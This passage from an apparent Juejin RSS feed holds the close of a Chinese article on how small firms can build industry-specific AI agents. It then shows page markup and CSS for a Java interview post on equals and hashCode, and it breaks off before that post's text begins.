<li>跨境电商Agent：能深度理解亚马逊、Shopee等平台的规则，知道怎么选品能避开侵权、怎么优化Listing能提高曝光，还能对接物流系统实时跟踪货物状态。这些行业细节，大厂的通用Agent根本覆盖不到。</li>
<li>医疗Agent：能结合某家医院的病历数据、科室流程，自动帮医生整理病历、开具检查单，甚至提醒患者复诊。这些基于特定机构的数据和流程，大厂很难获取。</li>
<li>制造Agent：能对接工厂的生产设备数据，实时监控生产进度，预测设备故障，还能自动生成生产报告。这些工业场景的专业知识，是通用Agent不具备的。</li>
</ul>
<p>对小厂来说，Agent不是“追赶大厂的负担”，而是“把行业知识产品化”的载体。通过Agent，小厂可以把自己多年积累的行业经验，变成一套自动化的解决方案，从“卖技术”的乙方，变成“提供结果”的合作伙伴。这是小厂在AI时代立足的关键。</p>
<h2 data-id="heading-3">四、结语：智能体经济，才刚刚拉开序幕</h2>
<p>最后想说，AI Agent的热潮，不是又一轮概念炒作，而是技术演进和商业逻辑共同作用的必然结果。它标志着AI从“辅助思考”走向“替代执行”，从“信息服务”走向“生产力工具”，整个AI行业的价值创造方式，正在发生结构性转变。</p>
<p>当然，现在的Agent还面临很多问题：稳定性不够（比如拆解任务时会出错）、成本太高（调用API和大模型的费用不低）、信任度不足（用户不敢让它处理敏感任务）。但这些都是技术发展初期的正常现象，就像当年的移动互联网，早期的App也很简陋，但并不妨碍它颠覆整个行业。</p>
<p>未来的商业格局，不再是“App之间的竞争”，而是“生态与生态的竞争”，是“通用Agent与垂直Agent的协作与博弈”。大厂掌控通用入口，小厂深耕垂直场景，最终形成一个“智能中枢+细分服务”的全新生态。</p>
<p>这场关于“行动智能”的突围战，已经打响。它无关乎“我们是否需要AI”，而关乎“我们如何让AI更好地为我们做事”。对企业来说，现在布局Agent，不是“选不选”的问题，而是“怎么选”的问题——是跟着大厂做生态，还是扎进垂直领域做深度？欢迎在评论区聊聊你的看法。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[【面试复盘】有了equals为什么还要hashcode]]></title>    <link>https://juejin.cn/post/7595147176752840704</link>    <guid>https://juejin.cn/post/7595147176752840704</guid>    <pubDate>2026-01-15T08:09:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595147176752840704" data-draft-id="7595131688940126248" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="【面试复盘】有了equals为什么还要hashcode"/> <meta itemprop="keywords" content="后端,Java"/> <meta itemprop="datePublished" content="2026-01-15T08:09:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="omenkk7"/> <meta itemprop="url" content="https://juejin.cn/user/933901076016858"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            【面试复盘】有了equals为什么还要hashcode
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/933901076016858/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    omenkk7
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:09:58.000Z" title="Thu Jan 15 2026 08:09:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body 